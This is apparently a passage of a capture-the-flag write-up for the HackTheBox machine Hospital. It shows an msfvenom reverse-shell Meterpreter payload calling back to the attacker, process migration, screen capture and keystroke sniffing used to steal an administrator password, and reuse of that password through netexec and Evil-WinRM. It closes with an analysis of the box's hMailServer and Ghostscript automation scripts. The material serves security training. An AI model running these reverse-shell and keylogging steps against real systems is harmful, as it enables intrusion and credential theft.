The `>` shows the session the current console is running in, with ID 0. There is another user, drbrown, logged in to an interactive session with ID 1. I got a similar result recently on [Reboud](/2024/03/30/htb-rebound.html#session) and used it with a cross session relay attack to get authenticated as the logged in user. In this case, the logged in user is the same user I am currently authenticated as, just in an interactive session.

#### Get Meterpreter Session

The strategy here is to monitor what the logged in user is doing. To best do this, I’m going to use Metasploit / Meterpreter, which comes with plugins for things like taking screenshots and capturing keystrokes.

To get a Meterpreter session, I’ll use `msfvenom` to create an `exe`:

```

oxdf@hacky$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -a x64 --platform windows -o rev.exe
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

I’ll start `msfconsole`, and `use exploit/multi/handler`. I’ll set the `payload` and the `LHOST` and run:

```

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.14.6
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4444

```

Back in Evil-WinRM, I’ll upload the malicious exe and run it:

```
*Evil-WinRM* PS C:\windows\temp> upload rev.exe
Info: Uploading rev.exe to C:\windows\temp\rev.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\windows\temp> .\rev.exe

```

I get a session at the Metasploit listener:

```

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (201798 bytes) to 10.10.11.241
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.11.241:6228) at 2024-04-10 04:27:18 -0400

meterpreter > 

```

#### Metasploit Enumeration

I’ll start by getting a screenshot of what is currently up on the user’s screen using the `espia` extension:

```

meterpreter > use espia
Loading extension espia...Success.
meterpreter > screengrab 
[-] espia_image_get_dev_screen: Operation failed: The handle is invalid.

```

It fails because my process is not in the session that the active user is in. If I look at the processes being run by drbrown, I’ll see that `rev.exe` is one of the only ones in session 0:

```

meterpreter > ps -U drbrown
Filtering on user 'drbrown'

Process List
============

 PID   PPID  Name                     Arch  Session  User              Path
 ---   ----  ----                     ----  -------  ----              ----
 376   656   svchost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\svchost.exe
 380   2980  sihost.exe               x64   1        HOSPITAL\drbrown  C:\Windows\System32\sihost.exe
 688   656   svchost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\svchost.exe
 1728  892   LockApp.exe              x64   1        HOSPITAL\drbrown  C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe
 1852  1712  explorer.exe             x64   1        HOSPITAL\drbrown  C:\Windows\explorer.exe
 2016  892   wsmprovhost.exe          x64   0        HOSPITAL\drbrown  C:\Windows\System32\wsmprovhost.exe
 2444  1496  powershell.exe           x64   1        HOSPITAL\drbrown  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2744  7816  IEDriverServer.exe       x86   1        HOSPITAL\drbrown  C:\Users\drbrown.HOSPITAL\.cache\selenium\IEDriverServer\win32\4.14.0\IEDriverServer.exe
 3088  1496  taskhostw.exe            x64   1        HOSPITAL\drbrown  C:\Windows\System32\taskhostw.exe
 3452  2744  iexplore.exe             x64   1        HOSPITAL\drbrown  C:\Program Files\internet explorer\iexplore.exe
 4552  892   ShellExperienceHost.exe  x64   1        HOSPITAL\drbrown  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 6492  2444  conhost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\conhost.exe
 6676  892   dllhost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\dllhost.exe
 7176  892   SearchUI.exe             x64   1        HOSPITAL\drbrown  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 7260  892   RuntimeBroker.exe        x64   1        HOSPITAL\drbrown  C:\Windows\System32\RuntimeBroker.exe
 7316  892   RuntimeBroker.exe        x64   1        HOSPITAL\drbrown  C:\Windows\System32\RuntimeBroker.exe
 7556  2016  rev.exe                  x64   0        HOSPITAL\drbrown  C:\Windows\Temp\rev.exe
 7624  3452  iexplore.exe             x86   1        HOSPITAL\drbrown  C:\Program Files (x86)\Internet Explorer\iexplore.exe
 7816  2444  python.exe               x64   1        HOSPITAL\drbrown  C:\Program Files\Python312\python.exe
 7888  892   RuntimeBroker.exe        x64   1        HOSPITAL\drbrown  C:\Windows\System32\RuntimeBroker.exe
 8008  1852  vmtoolsd.exe             x64   1        HOSPITAL\drbrown  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 9100  892   RuntimeBroker.exe        x64   1        HOSPITAL\drbrown  C:\Windows\System32\RuntimeBroker.exe

```

I’ll migrate to `explorer.exe` (which is usually a good target):

```

meterpreter > migrate 1852
[*] Migrating from 548 to 1852...
[*] Migration completed successfully.

```

Now it works:

```

meterpreter > screengrab
Screenshot saved to: /media/sf_CTFs/hackthebox/hospital-10.10.11.241/trpEeUWj.jpeg

```

![image-20240409215134296](/img/image-20240409215134296.png)

The user is logging into the webmail instance as administrator using what looks like Internet explorer. I’ll note that Internet Explorer is in the process list above.

Meterpreter has had a [Keystroke Sniffer](https://www.rapid7.com/blog/post/2009/03/22/remote-keystroke-sniffing-with-meterpreter/) since 2009. To use the keystroke sniffer, I have to be in a process with an interactive desktop, which I already am. `keyscan_start` is the command to start sniffing:

```

meterpreter > keyscan_start
Starting the keystroke sniffer ...

```

It is now constantly checking `GetAsyncKeyState` to check for what keys are down and logging it. This is prone to occasional errors. When I want to get a dump of what’s been typed, I’ll enter `keyscan_dump`. After 2 minutes or so, I’ll dump, and get:

```

meterpreter > keyscan_dump
Dumping captured keystrokes...
AdministratorTh3B3stH0sp1t4l9786!

```

#### Check Creds

These creds work for the administrator user for both SMB and WinRM:

```

oxdf@hacky$ netexec smb 10.10.11.241 -u administrator -p 'Th3B3stH0sp1t4l9786!'
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
oxdf@hacky$ netexec winrm 10.10.11.241 -u administrator -p 'Th3B3stH0sp1t4l9786!'
WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
WINRM       10.10.11.241    5985   DC               [+] hospital.htb\administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)

```

Both say “Pwn3d!”, meaning I can get a shell with them.

#### WinRM

The cleanest way to get a shell is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i 10.10.11.241 -u administrator -p 'Th3B3stH0sp1t4l9786!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And read the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
b60f96ed************************

```

### Via RDP

#### Connect

RDP is open on Hospital, and given that drbrown can connect over WinRM, it’s likely that they can connect to RDP as well. I’ll open `remmina` and create a new profile:

![image-20240410154157913](/img/image-20240410154157913.png)

On clicking “Save and Connect”, I’m connected to the box as drbrown:

![image-20240410154255456](/img/image-20240410154255456.png)

#### Recover Password

The password is obfuscated by the HTML password input, but the little eye icon offers the chance to see it. Clicking on it reveals the password:

![image-20240410155238916](/img/image-20240410155238916.png)

It can be a bit finicky, depending on the state of where the user is typing when I RDP in, sometimes it doesn’t let me click. The more reliable way is to open the dev tools (gear icon at the top right) and get it through the console:

![image-20240410160258361](/img/image-20240410160258361.png)

### Via Automation Discovery

#### Enumeration (as Administrator)

I didn’t find this path until after I had already got administrator access and was exploring how the automations for the box were configured.

As drbrown, I don’t have access to the scheduled tasks:

```
*Evil-WinRM* PS C:\windows\temp> schtasks /query /fo LIST /v
Program 'schtasks.exe' failed to run: Access is deniedAt line:1 char:1
+ schtasks /query /fo LIST /v
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ schtasks /query /fo LIST /v
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

As administrator, this one jumped out as interesting:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> schtasks /query /fo LIST /v
...[snip]...
HostName:                             DC
TaskName:                             \OneDriveUpdate
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive only
Last Run Time:                        4/10/2024 1:57:16 AM
Last Result:                          267009
Author:                               HOSPITAL\Administrator
Task To Run:                          powershell.exe -c "python.exe C:\Windows\System32\SyncAppvPublicationServer.vbs"
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          drbrown
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
...[snip]...

```

Why is Python running a `.vbs` file?

#### Enumeration (as drbrown)

While *I* originally only identified this script by viewing schedule tasks as administrator, there’s nothing to stop a user as drbrown from noticing this odd VBS / Python script in `C:\Windows\System32` and taking a look:

```

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import pyautogui
import time

pyautogui.FAILSAFE = False
driver = webdriver.Ie()
driver.maximize_window()
try:
        driver.get('https://localhost')
        time.sleep(3)
        driver.find_element('id', 'moreInfoContainer').click()
        time.sleep(3)
        driver.find_element('id', 'overridelink').click()
        time.sleep(3)
        user_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located(('id', 'rcmloginuser')))
        user_box_xy = user_box.location
        pass_box = driver.find_element('id', 'rcmloginpwd')
        pass_box_xy = pass_box.location
        while True:
                user_box.clear()
                user_box.click()
                pyautogui.typewrite('Administrator', interval=1.3)
                time.sleep(3)
                pass_box.clear()
                pass_box.click()
                pyautogui.typewrite("Th3B3stH0sp1t4l9786!", interval=1.3)
                time.sleep(117)
finally:
        driver.quit()

```

It runs an infinite loop of clearing the user box, writing “Administrator”, sleeping 3 seconds, moving to the password box, typing the password, and then sleeping about two minutes. It’s using [Selenium](https://www.selenium.dev/) to automate the browser loading the page and [PyAutoGUI](https://pyautogui.readthedocs.io/en/latest/) to manage the typing into the form on the website. With access to the script, I can grab the password and login as above.

## Beyond Root - Attachment Automation

### Overview

When I finish a box, I always like understanding how the box is set up to make it work. For Hospital, there are two simulated user steps that caught my attention. The first is the user entering the admin password into the webmail instance (which turned into an alternative root step [above](#via-automation-discovery)). The other is how the emailed `.eps` files would be opened by Ghostscript. I saw a little of that in the `.vbs` script in drbrown’s Documents folder.

### Tech Stack

RoundCube is a webmail server, but it needs a mail server behind it that manages the actual sending and receiving of mail. In this case, looking in `C:\Program Files (x86)`, `hMailServer` is installed:

```
*Evil-WinRM* PS C:\Program Files (x86)> ls

    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----         9/6/2023   4:09 PM                Google
d-----       10/22/2023  10:01 PM                hMailServer
d-----       10/27/2023  12:20 AM                Internet Explorer
d-----         9/5/2023   9:37 AM                Microsoft SDKs
d-----       10/22/2023  10:01 PM                Microsoft SQL Server Compact Edition
d-----       10/22/2023  10:01 PM                Microsoft Synchronization Services
d-----        9/15/2018  12:19 AM                Microsoft.NET
d-----       10/22/2023   9:56 PM                MSBuild
d-----         9/5/2023   9:36 AM                Reference Assemblies
d-----         9/5/2023   9:37 AM                Windows Kits
d-----        11/5/2022  12:03 PM                Windows Mail
d-----        11/5/2022  12:03 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell

```

The installation looks like:

```
*Evil-WinRM* PS C:\Program Files (x86)\hMailServer> ls

    Directory: C:\Program Files (x86)\hMailServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/22/2023  10:01 PM                Addons
d-----       10/22/2023  10:01 PM                Bin
d-----         4/9/2024  11:30 PM                Data
d-----       10/22/2023  10:01 PM                Database
d-----       10/22/2023  10:01 PM                DBScripts
d-----       10/23/2023  12:41 PM                Events
d-----       10/22/2023  10:01 PM                Languages
d-----       10/23/2023   1:48 PM                Logs
d-----       10/22/2023  10:01 PM                PHPWebAdmin
d-----       10/22/2023  10:01 PM                Temp
-a----       10/22/2023  10:01 PM          56832 unins000.dat
-a----       10/22/2023  10:01 PM         718530 unins000.exe

```

### hMail Scripting

The hMailServer docs have a [page on Scripting](https://www.hmailserver.com/documentation/v5.1/?page=feature_scripting):

> hMailServer 4.0 and later enable you to write your own scripts to extend the server’s functionality. Support for Microsoft VBScript and Microsoft JScript currently exists in the server. You will find at hMailServer.com useful sample scripts written in VBScript. For general script syntax, you should consult the [Microsoft MSDN](http://msdn.microsoft.com/library/default.asp?url=/library/en-us/script56/html/vtoriMicrosoftWindowsScriptTechnologies.asp) library.
>
> All hMailServer scripts should be placed in a file called EventHandlers.vbs. The file is found in the hMailServer Events directory, normally C:\Program Files\hMailServer\Events.

That file exists!

```
*Evil-WinRM* PS C:\Program Files (x86)\hMailServer> ls events

    Directory: C:\Program Files (x86)\hMailServer\events

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/23/2023   3:35 PM           1282 EventHandlers.vbs

```

The script it:

```

Function RunCommand(sCommand)
        Dim obShell
        Set obShell = CreateObject("WScript.Shell")
        obShell.Run sCommand, 0, true
        Set obShell = Nothing
End Function

Sub SaveAttachment(oMessage)
        Dim i, strDir, strFile
        strDir = "C:\Users\drbrown.HOSPITAL\Downloads\"
        For i = 0 To oMessage.Attachments.Count-1
                strFile = oMessage.Attachments.item(i).Filename
                oMessage.Attachments.item(i).SaveAs(strDir & strFile)
        Next
        If Right(strFile, 4) = ".eps" Then
                call RunCommand("C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat " & strFile)
        Else
                Dim fso, file
                Set fso = CreateObject("Scripting.FileSystemObject")
                fso.DeleteFile strDir & strFile
        End If

End Sub

```

Somehow in the hMailServer admin, it must be running the `SaveAttachment` function on each received email. This will loop over the attachments, saving each in the `Downloads` directory in drbrown’s profile.

I think the next part is probably a logic error in the script. It will check the last attachment’s filename to see if it ends with “.eps”. It should probably be checking each attachment in a loop. But given most HTB players will only send one attachment, it probably doesn’t matter much.

If that attachment has the `.eps` extension, it calls `ghostscript.bat`, passing the filename in as an argument. If not, it deletes the file.

The script looks to have been very likely adapted from the script in [this post](https://hmailserver.com/forum/viewtopic.php?t=35104) on the hMailServer forum.

### ghostscript.bat

I identified `ghostscript.bat` earlier, but didn’t look at what it does:

```

@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"

```

It sets the input argument (known to be the filename) to the variable `filename`. Then it runs `powershell`, first creating a credential object as drbrown, and using it to `Invoke-Command`. That’s because hMail is likely running as System or a service account, but this script is simulating user activity as drbrown. The command that’s called with `Invoke-Command` is `gswin64c.exe` with the `-dNOSAFER` option and the filename passed in.

This is the Ghostscript binary, and the `-dNOSAFER` flag is, according to the [docs](https://ghostscript.com/docs/9.54.0/Use.htm):

> `-dNOSAFER` (equivalent to `-dDELAYSAFER`).
>
> This flag disables SAFER mode until the `.setsafe` procedure is run. This is intended for clients or scripts that cannot operate in SAFER mode. If Ghostscript is started with `-dNOSAFER` or `-dDELAYSAFER`, PostScript programs are allowed to read, write, rename or delete any files in the system that are not protected by operating system permissions.

This mode is required for the exploit to work.